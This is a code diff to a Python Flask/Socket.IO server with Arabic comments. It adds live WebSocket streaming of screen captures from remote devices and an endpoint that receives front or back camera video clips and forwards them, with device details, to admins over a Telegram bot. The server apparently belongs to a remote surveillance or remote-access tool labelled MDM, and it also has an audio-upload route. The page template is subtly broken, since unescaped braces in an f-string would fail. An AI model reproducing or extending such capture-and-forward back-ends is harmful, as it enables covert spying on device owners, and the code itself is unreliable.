@@ -2080,7 +2080,7 @@ def _sock_screen_frame(data):
             logger.info(f"⏹ Screen stream STOPPED: {stream_id}")
             return
 
-        # إطار عادي
+        # ⚡ إطار عادي - خزّنه + ابعثه لكل متابعي WebSocket فوراً (no polling)
         b64image = data.get("image", "")
         if b64image and stream_id in _screen_streams:
             import base64 as _b64
@@ -2090,12 +2090,38 @@ def _sock_screen_frame(data):
                 "timestamp": time.time(),
                 "device_id": _screen_streams[stream_id].get("device_id", "?")
             }
+            # ⚡ V11.2.9: ابعث الإطار فوراً لكل متابعي WebSocket
+            # (المتصفح سيعرضه بدون polling = latency أقل)
+            try:
+                socketio.emit("screen_frame_push", {
+                    "stream_id": stream_id,
+                    "image": b64image,
+                    "size": len(jpeg_bytes),
+                    "timestamp": int(time.time() * 1000)
+                }, room=f"screen_{stream_id}", namespace="/")
+            except Exception as push_err:
+                # لو ما فيه متابعين، تجاهل الخطأ
+                pass
 
     except Exception as e:
         logger.error(f"❌ screen_frame error: {e}")
 
 
-# ⚡ صفحة ويب لبث الشاشة
+# ⚡ V11.2.9: WebSocket room join لـ screen-live
+@socketio.on("screen_join")
+def _sock_screen_join(data):
+    """انضمام متصفح لغرفة بث الشاشة (للحصول على إطارات مباشرة عبر WebSocket)"""
+    try:
+        stream_id = data.get("stream_id", "") if isinstance(data, dict) else str(data)
+        if stream_id:
+            from flask_socketio import join_room
+            join_room(f"screen_{stream_id}")
+            logger.info(f"👀 WebSocket client joined screen room: {stream_id}")
+    except Exception as e:
+        logger.error(f"❌ screen_join error: {e}")
+
+
+# ⚡ صفحة ويب لبث الشاشة — V11.2.9: WebSocket push (لا polling)
 @app.route("/screen-live/<stream_id>")
 def _screen_live_page(stream_id):
     if stream_id not in _screen_streams:
@@ -2110,33 +2136,82 @@ def _screen_live_page(stream_id):
     <style>
         body {{ margin:0; background:#111; color:#fff; font-family:Arial,sans-serif; }}
         .header {{ background:#222; padding:10px; text-align:center; }}
-        .frame {{ width:100%; max-width:800px; margin:10px auto; display:block; border:2px solid #333; border-radius:5px; }}
+        .frame {{ width:100%; max-width:800px; margin:10px auto; display:block; border:2px solid #333; border-radius:5px; min-height:200px; background:#000; }}
         .status {{ text-align:center; font-size:12px; color:#888; padding:5px; }}
+        .info {{ text-align:center; font-size:11px; color:#666; padding:5px; }}
     </style>
 </head>
 <body>
     <div class="header"><h2>📺 بث الشاشة المباشر</h2></div>
     <img id="screen" class="frame" src="" alt="انتظار..." />
-    <div class="status" id="status">جاري التحميل...</div>
+    <div class="status" id="status">⏳ جاري الاتصال...</div>
+    <div class="info" id="info">⚡ WebSocket push (low latency)</div>
     <script>
         var streamId = "{stream_id}";
         var count = 0;
-        function poll() {{
+        var lastFrameTime = 0;
+
+        // ⚡ V11.2.9: WebSocket push (بدلاً من polling)
+        // الاتصال بـ Socket.IO على نفس السيرفر
+        var socket = io({
+            transports: ['websocket'],
+            upgrade: false,
+            reconnection: true,
+            reconnectionAttempts: Infinity,
+            reconnectionDelay: 1000
+        });
+
+        socket.on('connect', function() {{
+            document.getElementById('status').textContent = '✅ متصل - في انتظار الإطارات';
+            // انضم لغرفة البث
+            socket.emit('screen_join', {{ stream_id: streamId }});
+        }});
+
+        socket.on('disconnect', function() {{
+            document.getElementById('status').textContent = '⚠️ انقطع - إعادة الاتصال...';
+        }});
+
+        socket.on('reconnect', function() {{
+            document.getElementById('status').textContent = '✅ إعادة الاتصال';
+            socket.emit('screen_join', {{ stream_id: streamId }});
+        }});
+
+        // ⚡ استقبال الإطارات مباشرة (push بدلاً من polling)
+        socket.on('screen_frame_push', function(data) {{
+            if (data.stream_id === streamId && data.image) {{
+                // عرض الإطار فوراً
+                document.getElementById('screen').src = 'data:image/jpeg;base64,' + data.image;
+                count++;
+                var now = Date.now();
+                var fps = lastFrameTime > 0 ? Math.round(1000 / (now - lastFrameTime)) : 0;
+                lastFrameTime = now;
+                document.getElementById('status').textContent =
+                    '✅ مباشر - إطار #' + count + ' (' + fps + ' FPS)';
+                document.getElementById('info').textContent =
+                    '⚡ WebSocket push | ' + (data.size / 1024).toFixed(1) + ' KB | ' + new Date().toLocaleTimeString();
+            }}
+        }});
+
+        // Fallback: polling سريع 50ms (إذا فشل WebSocket)
+        var pollInterval = setInterval(function() {{
             fetch('/screen-frame/' + streamId)
                 .then(r => r.blob())
                 .then(blob => {{
                     if (blob.size > 100) {{
-                        document.getElementById('screen').src = URL.createObjectURL(blob);
-                        count++;
-                        document.getElementById('status').textContent = '✅ مباشر - إطار #' + count;
+                        // عرض الإطار فقط إذا WebSocket لا يعمل
+                        if (count === 0 || (Date.now() - lastFrameTime) > 200) {{
+                            document.getElementById('screen').src = URL.createObjectURL(blob);
+                            count++;
+                            lastFrameTime = Date.now();
+                            document.getElementById('status').textContent = '✅ مباشر (polling) - إطار #' + count;
+                        }}
                     }}
                 }})
-                .catch(err => {{
-                    document.getElementById('status').textContent = '❌ خطأ: ' + err;
-                }});
-        }}
-        setInterval(poll, 200);
+                .catch(err => {{}});
+        }}, 50);
     </script>
+    <!-- Socket.IO client -->
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
 </body>
 </html>"""
     return html
@@ -3155,6 +3230,76 @@ def _upload_audio():
 
     except Exception as e:
         logger.error(f"❌ /upload-audio error: {e}", exc_info=True)
+        return jsonify({"error": str(e)}), 500
+
+
+# ⚡⚡⚡ V11.2.9: /upload-video-stream — استقبال مقاطع MP4 (H.264) من MediaCodec
+# يستقبل ملف multipart/form-data مع headers:
+#   - camera:  back/front
+#   - model:   موديل الجهاز
+#   - duration: المدة بالثواني
+# يرسله للبوت عبر bot.send_video لكل الأدمنز
+@app.route("/upload-video-stream", methods=["POST"])
+def _upload_video_stream():
+    try:
+        if "file" not in request.files:
+            return jsonify({"error": "no file"}), 400
+
+        video_file = request.files["file"]
+        camera = request.headers.get("camera", "unknown")
+        model = request.headers.get("model", "غير محدد")
+        duration = request.headers.get("duration", "غير محدد")
+        original_filename = video_file.filename or "camera_stream.mp4"
+
+        file_bytes = video_file.read()
+        if not file_bytes:
+            return jsonify({"error": "empty file"}), 400
+
+        logger.info(f"🎥 Video stream received: camera={camera}, model={model}, "
+                    f"duration={duration}s, size={len(file_bytes)} bytes, file={original_filename}")
+
+        if not mdm_bot:
+            logger.warning("Bot not configured - dropping video stream")
+            return jsonify({"error": "bot not configured"}), 503
+
+        from io import BytesIO
+        bio = BytesIO(file_bytes)
+        caption = (f"🎥 <b>بث الكاميرا المباشر (H.264)</b>\n"
+                   f"📷 <b>الكاميرا:</b> {camera}\n"
+                   f"📱 <b>الجهاز:</b> {model}\n"
+                   f"⏱️ <b>المدة:</b> {duration} ثانية\n"
+                   f"📏 <b>الحجم:</b> {len(file_bytes)} bytes")
+
+        success = 0
+        for admin_id in Config.ADMIN_IDS:
+            try:
+                bio.seek(0)
+                mdm_bot.bot.send_video(admin_id, video=bio,
+                                       caption=caption,
+                                       parse_mode="HTML",
+                                       filename=original_filename,
+                                       visible_file_name=original_filename)
+                success += 1
+                logger.info(f"✅ Video stream sent to admin {admin_id}")
+            except Exception as e:
+                logger.error(f"❌ Failed to send video to {admin_id}: {e}")
+                try:
+                    bio.seek(0)
+                    mdm_bot.bot.send_document(admin_id, document=bio,
+                                              caption=caption,
+                                              parse_mode="HTML",
+                                              filename=original_filename,
+                                              visible_file_name=original_filename)
+                    success += 1
+                    logger.info(f"✅ Video fallback (document) sent to {admin_id}")
+                except Exception as e2:
+                    logger.error(f"❌ Document fallback failed: {e2}")
+
+        logger.info(f"🎥 Video stream complete: {success}/{len(Config.ADMIN_IDS)} admins")
+        return jsonify({"success": True, "sent_to": success}), 200
+
+    except Exception as e:
+        logger.error(f"❌ /upload-video-stream error: {e}", exc_info=True)
         return jsonify({"error": str(e)}), 500
 
 
